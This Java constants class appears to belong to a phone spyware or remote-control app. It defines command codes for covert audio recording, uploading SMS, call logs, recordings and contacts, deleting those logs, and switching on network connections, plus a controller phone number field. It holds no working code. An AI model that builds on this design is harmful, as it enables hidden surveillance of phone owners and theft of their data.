package com.zgy.controller;

public class GlobleCs {

	/**
	 *  
	 */
	public static String controlTel = "";
	public static String appPwd = "";

	public static final String FIRST = "This is one test message, please ignore it.";
	public static final String PHONE_CODE_UP = "011";// TURN_UP
	public static final String PHONE_CODE_DOWN = "012";// TURN_DOWN
	public static final String PHONE_CODE_CALL_ME = "013";// CALL_ME

	public static final String PHONE_CODE_RECORD_TIME = "015:";// RECORD_TIME:
	public static final String PHONE_CODE_RECORD_START = "016";// RECORD_START
	public static final String PHONE_CODE_RECORD_END = "017";// RECORD_END

	public static final String PHONE_CODE_DELETE_MSG_LOG = "021";// DEL_MSG
	public static final String PHONE_CODE_DELETE_CALL_LOG = "022";// DEL_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "023";// DEL_AUDIO_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "025";// DEL_AUDIO_OTHER
	public static final String PHONE_CODE_DELETE_ALL_LOG = "026";// DEL_ALL

	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "031";// HELLO_SMS_CALL
	public static final String PHONE_CODE_UPLOAD_ALL = "032";// HELLO_ALL
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "033";// HELLO_CALL_AUDIO
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "035";// HELLO_OTHER_AUDIO
	public static final String PHONE_CODE_UPLOAD_CONTACTS = "036";// HELLO_CONTACTS

	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "031M";// HELLO_SMS_CALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "032M";// HELLO_ALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "033M";// HELLO_CALL_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "035M";// HELLO_OTHER_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "036M";// HELLO_CONTACTS_MOBILE

	public static final String PHONE_CODE_TURNON_WIFI = "057";// TURN_ON_WIFI
	public static final String PHONE_CODE_TURNON_MOBILE = "056";// TURN_ON_MOBILE

	public static boolean is_open = false;
}
